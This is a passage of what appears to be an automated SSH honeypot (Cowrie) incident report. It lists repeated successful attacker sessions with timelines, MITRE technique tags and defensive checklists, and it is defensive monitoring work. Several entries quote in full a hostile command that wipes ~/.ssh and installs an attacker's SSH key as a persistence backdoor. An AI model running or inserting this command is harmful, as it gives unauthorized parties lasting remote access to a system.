| `2026-04-22 18:10:50` | `cowrie.login.success` |
| `2026-04-22 18:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392f9b1abcb2

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]8` |
| **First Seen** | 2026-04-22 18:12 |
| **Last Seen** | 2026-04-22 18:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:12:03` | `cowrie.session.connect` |
| `2026-04-22 18:12:03` | `cowrie.client.version` |
| `2026-04-22 18:12:04` | `cowrie.client.kex` |
| `2026-04-22 18:12:04` | `cowrie.login.success` |
| `2026-04-22 18:12:04` | `cowrie.session.params` |
| `2026-04-22 18:12:04` | `cowrie.command.input` |
| `2026-04-22 18:12:04` | `cowrie.command.failed` |
| `2026-04-22 18:12:05` | `cowrie.log.closed` |
| `2026-04-22 18:12:05` | `cowrie.session.params` |
| `2026-04-22 18:12:05` | `cowrie.command.input` |
| `2026-04-22 18:12:05` | `cowrie.session.file_download` |
| `2026-04-22 18:12:05` | `cowrie.log.closed` |
| `2026-04-22 18:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]8` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0df8ca9e544

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]8` |
| **First Seen** | 2026-04-22 18:12 |
| **Last Seen** | 2026-04-22 18:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:12:07` | `cowrie.session.connect` |
| `2026-04-22 18:12:07` | `cowrie.client.version` |
| `2026-04-22 18:12:07` | `cowrie.client.kex` |
| `2026-04-22 18:12:08` | `cowrie.login.success` |
| `2026-04-22 18:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]8` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93da5750ca1f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:14 |
| **Last Seen** | 2026-04-22 18:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:14:14` | `cowrie.session.connect` |
| `2026-04-22 18:14:14` | `cowrie.client.version` |
| `2026-04-22 18:14:14` | `cowrie.client.kex` |
| `2026-04-22 18:14:15` | `cowrie.login.success` |
| `2026-04-22 18:14:15` | `cowrie.session.params` |
| `2026-04-22 18:14:15` | `cowrie.command.input` |
| `2026-04-22 18:14:15` | `cowrie.command.failed` |
| `2026-04-22 18:14:15` | `cowrie.log.closed` |
| `2026-04-22 18:14:15` | `cowrie.session.params` |
| `2026-04-22 18:14:15` | `cowrie.command.input` |
| `2026-04-22 18:14:15` | `cowrie.session.file_download` |
| `2026-04-22 18:14:15` | `cowrie.log.closed` |
| `2026-04-22 18:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405f6aabb418

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:14 |
| **Last Seen** | 2026-04-22 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:14:17` | `cowrie.session.connect` |
| `2026-04-22 18:14:17` | `cowrie.client.version` |
| `2026-04-22 18:14:17` | `cowrie.client.kex` |
| `2026-04-22 18:14:18` | `cowrie.login.success` |
| `2026-04-22 18:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc84cd203f0e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:15 |
| **Last Seen** | 2026-04-22 18:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:15:03` | `cowrie.session.connect` |
| `2026-04-22 18:15:03` | `cowrie.client.version` |
| `2026-04-22 18:15:03` | `cowrie.client.kex` |
| `2026-04-22 18:15:04` | `cowrie.login.success` |
| `2026-04-22 18:15:04` | `cowrie.session.params` |
| `2026-04-22 18:15:04` | `cowrie.command.input` |
| `2026-04-22 18:15:04` | `cowrie.command.failed` |
| `2026-04-22 18:15:04` | `cowrie.log.closed` |
| `2026-04-22 18:15:04` | `cowrie.session.params` |
| `2026-04-22 18:15:04` | `cowrie.command.input` |
| `2026-04-22 18:15:04` | `cowrie.session.file_download` |
| `2026-04-22 18:15:04` | `cowrie.log.closed` |
| `2026-04-22 18:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd8df1215c6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:15 |
| **Last Seen** | 2026-04-22 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:15:06` | `cowrie.session.connect` |
| `2026-04-22 18:15:06` | `cowrie.client.version` |
| `2026-04-22 18:15:06` | `cowrie.client.kex` |
| `2026-04-22 18:15:07` | `cowrie.login.success` |
| `2026-04-22 18:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e33ef2a72467

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:15 |
| **Last Seen** | 2026-04-22 18:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:15:57` | `cowrie.session.connect` |
| `2026-04-22 18:15:57` | `cowrie.client.version` |
| `2026-04-22 18:15:57` | `cowrie.client.kex` |
| `2026-04-22 18:15:59` | `cowrie.login.success` |
| `2026-04-22 18:15:59` | `cowrie.session.params` |
| `2026-04-22 18:15:59` | `cowrie.command.input` |
| `2026-04-22 18:15:59` | `cowrie.command.failed` |
| `2026-04-22 18:16:00` | `cowrie.log.closed` |
| `2026-04-22 18:16:01` | `cowrie.session.params` |
| `2026-04-22 18:16:01` | `cowrie.command.input` |
| `2026-04-22 18:16:01` | `cowrie.session.file_download` |
| `2026-04-22 18:16:01` | `cowrie.log.closed` |
| `2026-04-22 18:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11caa875721a

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:16 |
| **Last Seen** | 2026-04-22 18:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:16:05` | `cowrie.session.connect` |
| `2026-04-22 18:16:05` | `cowrie.client.version` |
| `2026-04-22 18:16:06` | `cowrie.client.kex` |
| `2026-04-22 18:16:07` | `cowrie.login.success` |
| `2026-04-22 18:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca723286dd0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:17 |
| **Last Seen** | 2026-04-22 18:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:17:29` | `cowrie.session.connect` |
| `2026-04-22 18:17:29` | `cowrie.client.version` |
| `2026-04-22 18:17:29` | `cowrie.client.kex` |
| `2026-04-22 18:17:29` | `cowrie.login.success` |
| `2026-04-22 18:17:30` | `cowrie.session.params` |
| `2026-04-22 18:17:30` | `cowrie.command.input` |
| `2026-04-22 18:17:30` | `cowrie.command.failed` |
| `2026-04-22 18:17:30` | `cowrie.log.closed` |
| `2026-04-22 18:17:30` | `cowrie.session.params` |
| `2026-04-22 18:17:30` | `cowrie.command.input` |
| `2026-04-22 18:17:30` | `cowrie.session.file_download` |
| `2026-04-22 18:17:30` | `cowrie.log.closed` |
| `2026-04-22 18:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042123bfa4aa

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:17 |
| **Last Seen** | 2026-04-22 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:17:32` | `cowrie.session.connect` |
| `2026-04-22 18:17:32` | `cowrie.client.version` |
| `2026-04-22 18:17:32` | `cowrie.client.kex` |
| `2026-04-22 18:17:32` | `cowrie.login.success` |
| `2026-04-22 18:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13b079f3dd9b

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:17 |
| **Last Seen** | 2026-04-22 18:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:17:56` | `cowrie.session.connect` |
| `2026-04-22 18:17:56` | `cowrie.client.version` |
| `2026-04-22 18:17:56` | `cowrie.client.kex` |
| `2026-04-22 18:17:58` | `cowrie.login.success` |
| `2026-04-22 18:17:59` | `cowrie.session.params` |
| `2026-04-22 18:17:59` | `cowrie.command.input` |
| `2026-04-22 18:17:59` | `cowrie.command.failed` |
| `2026-04-22 18:17:59` | `cowrie.log.closed` |
| `2026-04-22 18:18:00` | `cowrie.session.params` |
| `2026-04-22 18:18:00` | `cowrie.command.input` |
| `2026-04-22 18:18:00` | `cowrie.session.file_download` |
| `2026-04-22 18:18:00` | `cowrie.log.closed` |
| `2026-04-22 18:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36dda288a4d3

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:18 |
| **Last Seen** | 2026-04-22 18:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:18:04` | `cowrie.session.connect` |
| `2026-04-22 18:18:04` | `cowrie.client.version` |
| `2026-04-22 18:18:05` | `cowrie.client.kex` |
| `2026-04-22 18:18:06` | `cowrie.login.success` |
| `2026-04-22 18:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3368f139f27f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:18 |
| **Last Seen** | 2026-04-22 18:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:18:18` | `cowrie.session.connect` |
| `2026-04-22 18:18:18` | `cowrie.client.version` |
| `2026-04-22 18:18:18` | `cowrie.client.kex` |
| `2026-04-22 18:18:18` | `cowrie.login.success` |
| `2026-04-22 18:18:19` | `cowrie.session.params` |
| `2026-04-22 18:18:19` | `cowrie.command.input` |
| `2026-04-22 18:18:19` | `cowrie.command.failed` |
| `2026-04-22 18:18:19` | `cowrie.log.closed` |
| `2026-04-22 18:18:19` | `cowrie.session.params` |
| `2026-04-22 18:18:19` | `cowrie.command.input` |
| `2026-04-22 18:18:19` | `cowrie.session.file_download` |
| `2026-04-22 18:18:19` | `cowrie.log.closed` |
| `2026-04-22 18:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d88ce213ec

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:18 |
| **Last Seen** | 2026-04-22 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:18:21` | `cowrie.session.connect` |
| `2026-04-22 18:18:21` | `cowrie.client.version` |
| `2026-04-22 18:18:21` | `cowrie.client.kex` |
| `2026-04-22 18:18:22` | `cowrie.login.success` |
| `2026-04-22 18:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c1d45742b31

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:19 |
| **Last Seen** | 2026-04-22 18:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:19:59` | `cowrie.session.connect` |
| `2026-04-22 18:19:59` | `cowrie.client.version` |
| `2026-04-22 18:20:00` | `cowrie.client.kex` |
| `2026-04-22 18:20:01` | `cowrie.login.success` |
| `2026-04-22 18:20:02` | `cowrie.session.params` |
| `2026-04-22 18:20:02` | `cowrie.command.input` |
| `2026-04-22 18:20:02` | `cowrie.command.failed` |
| `2026-04-22 18:20:02` | `cowrie.log.closed` |
| `2026-04-22 18:20:03` | `cowrie.session.params` |
| `2026-04-22 18:20:03` | `cowrie.command.input` |
| `2026-04-22 18:20:04` | `cowrie.session.file_download` |
| `2026-04-22 18:20:04` | `cowrie.log.closed` |
| `2026-04-22 18:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d6bb4fd1f8

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:20 |
| **Last Seen** | 2026-04-22 18:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:20:08` | `cowrie.session.connect` |
| `2026-04-22 18:20:08` | `cowrie.client.version` |
| `2026-04-22 18:20:08` | `cowrie.client.kex` |
| `2026-04-22 18:20:09` | `cowrie.login.success` |
| `2026-04-22 18:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726df7d40cfe

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:21 |
| **Last Seen** | 2026-04-22 18:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
